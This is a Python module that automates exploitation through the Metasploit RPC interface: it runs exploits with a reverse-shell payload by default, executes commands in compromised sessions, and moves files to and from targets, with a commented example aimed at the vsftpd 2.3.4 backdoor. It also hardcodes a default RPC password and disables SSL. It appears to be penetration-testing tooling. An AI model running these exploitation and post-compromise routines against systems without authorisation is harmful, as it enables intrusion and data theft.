"""Module MSFClient - Exploitation via Metasploit Framework"""
import time
import json
from typing import Dict, List, Optional
try:
    from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError
    METASPLOIT_AVAILABLE = True
except ImportError:
    METASPLOIT_AVAILABLE = False
    print("[WARNING] pymetasploit3 not installed. MSF functionality disabled.")


class MSFClient:
    """Client Metasploit RPC pour exploitation automatisÃ©e"""
    
    def __init__(self, password: str = 'msf', host: str = '127.0.0.1', port: int = 55553):
        """
        Initialize MSF RPC client
        
        Args:
            password: msfrpcd password
            host: msfrpcd host
            port: msfrpcd port
        """
        self.password = password
        self.host = host
        self.port = port
        self.client = None
        self.sessions = {}
        self.connected = False
    
    def connect(self) -> bool:
        """Connect to msfrpcd"""
        if not METASPLOIT_AVAILABLE:
            print("[MSF] pymetasploit3 not available")
            return False
        
        try:
            self.client = MsfRpcClient(
                password=self.password,
                server=self.host,
                port=self.port,
                ssl=False
            )
            self.connected = True
            print(f"[MSF] Connected to {self.host}:{self.port}")
            return True
        
        except Exception as e:
            print(f"[MSF] Connection failed: {e}")
            self.connected = False
            return False
    
    def list_exploits(self, filter_str: str = '') -> List[Dict]:
        """List available exploits"""
        if not self.connected:
            return []
        
        try:
            exploits = self.client.modules.exploits
            
            if filter_str:
                filtered = [e for e in exploits if filter_str.lower() in e.lower()]
            else:
                filtered = exploits
            
            return [{'name': e, 'type': 'exploit'} for e in filtered[:100]]  # Limit to 100
        
        except Exception as e:
            print(f"[MSF] List exploits failed: {e}")
            return []
    
    def get_exploit_info(self, exploit_name: str) -> Dict:
        """Get detailed exploit information"""
        if not self.connected:
            return {}
        
        try:
            exploit = self.client.modules.use('exploit', exploit_name)
            
            info = {
                'name': exploit_name,
                'description': exploit.description,
                'targets': exploit.targets,
                'options': exploit.options,
                'required_options': exploit.required,
                'payloads': exploit.compatible_payloads
            }
            
            return info
        
        except Exception as e:
            print(f"[MSF] Get exploit info failed: {e}")
            return {}
    
    def run_exploit(self, exploit_name: str, options: Dict, payload: str = 'generic/shell_reverse_tcp') -> Dict:
        """
        Run exploit with specified options
        
        Args:
            exploit_name: Full exploit path (e.g., 'exploit/unix/ftp/vsftpd_234_backdoor')
            options: Dict of exploit options
            payload: Payload to use
        
        Returns:
            Dict with success status, session_id if successful
        """
        if not self.connected:
            return {'success': False, 'error': 'Not connected'}
        
        try:
            # Use exploit
            exploit = self.client.modules.use('exploit', exploit_name)
            
            # Set options
            for key, value in options.items():
                exploit[key] = value
            
            # Set payload
            exploit.payload = payload
            
            # Execute
            print(f"[MSF] Executing {exploit_name} against {options.get('RHOSTS', 'unknown')}")
            result = exploit.execute()
            
            # Check for session
            time.sleep(2)  # Wait for session establishment
            sessions = self.client.sessions.list
            
            if sessions:
                session_id = list(sessions.keys())[-1]  # Get latest session
                session_info = sessions[session_id]
                
                self.sessions[session_id] = session_info
                
                print(f"[MSF] Exploit successful! Session ID: {session_id}")
                
                return {
                    'success': True,
                    'session_id': session_id,
                    'session_type': session_info.get('type', 'shell'),
                    'target_info': {
                        'ip': options.get('RHOSTS'),
                        'platform': session_info.get('platform', 'unknown'),
                        'arch': session_info.get('arch', 'unknown')
                    }
                }
            else:
                print(f"[MSF] Exploit executed but no session created")
                return {'success': False, 'error': 'No session created'}
        
        except Exception as e:
            print(f"[MSF] Exploit execution failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def execute_command(self, session_id: int, command: str) -> str:
        """Execute command in session"""
        if not self.connected:
            return ""
        
        try:
            session = self.client.sessions.session(str(session_id))
            
            # Write command
            session.write(command + '\n')
            time.sleep(1)
            
            # Read output
            output = session.read()
            
            return output
        
        except Exception as e:
            print(f"[MSF] Command execution failed: {e}")
            return ""
    
    def upload_file(self, session_id: int, local_path: str, remote_path: str) -> bool:
        """Upload file through session"""
        if not self.connected:
            return False
        
        try:
            # Read local file
            with open(local_path, 'rb') as f:
                data = f.read()
            
            # Upload via session
            session = self.client.sessions.session(str(session_id))
            
            # Use meterpreter upload if available
            if self.sessions.get(session_id, {}).get('type') == 'meterpreter':
                session.upload_file(remote_path, local_path)
                print(f"[MSF] Uploaded {local_path} to {remote_path}")
                return True
            else:
                # For shell sessions, use base64 encoding
                import base64
                encoded = base64.b64encode(data).decode()
                
                # Create remote file with base64 decode
                cmd = f"echo '{encoded}' | base64 -d > {remote_path}"
                self.execute_command(session_id, cmd)
                
                print(f"[MSF] Uploaded {local_path} to {remote_path} (via base64)")
                return True
        
        except Exception as e:
            print(f"[MSF] File upload failed: {e}")
            return False
    
    def download_file(self, session_id: int, remote_path: str, local_path: str) -> bool:
        """Download file through session"""
        if not self.connected:
            return False
        
        try:
            session = self.client.sessions.session(str(session_id))
            
            # Use meterpreter download if available
            if self.sessions.get(session_id, {}).get('type') == 'meterpreter':
                session.download_file(local_path, remote_path)
                print(f"[MSF] Downloaded {remote_path} to {local_path}")
                return True
            else:
                # For shell sessions, cat and capture
                output = self.execute_command(session_id, f"cat {remote_path}")
                
                with open(local_path, 'w') as f:
                    f.write(output)
                
                print(f"[MSF] Downloaded {remote_path} to {local_path}")
                return True
        
        except Exception as e:
            print(f"[MSF] File download failed: {e}")
            return False
    
    def close_session(self, session_id: int) -> bool:
        """Close session"""
        if not self.connected:
            return False
        
        try:
            self.client.sessions.session(str(session_id)).stop()
            
            if session_id in self.sessions:
                del self.sessions[session_id]
            
            print(f"[MSF] Closed session {session_id}")
            return True
        
        except Exception as e:
            print(f"[MSF] Close session failed: {e}")
            return False
    
    def list_sessions(self) -> Dict:
        """List all active sessions"""
        if not self.connected:
            return {}
        
        try:
            return self.client.sessions.list
        except Exception as e:
            print(f"[MSF] List sessions failed: {e}")
            return {}
    
    def disconnect(self):
        """Disconnect from msfrpcd"""
        if self.connected:
            # Close all sessions
            for session_id in list(self.sessions.keys()):
                self.close_session(session_id)
            
            self.client = None
            self.connected = False
            print("[MSF] Disconnected")


# Example usage
if __name__ == '__main__':
    # Create client
    msf = MSFClient(password='msf')
    
    # Connect
    if msf.connect():
        # List exploits
        exploits = msf.list_exploits('vsftpd')
        print(f"Found {len(exploits)} exploits matching 'vsftpd'")
        
        # Example exploit execution
        # result = msf.run_exploit(
        #     'exploit/unix/ftp/vsftpd_234_backdoor',
        #     {'RHOSTS': '192.168.1.100', 'RPORT': 21}
        # )
        
        # Disconnect
        msf.disconnect()
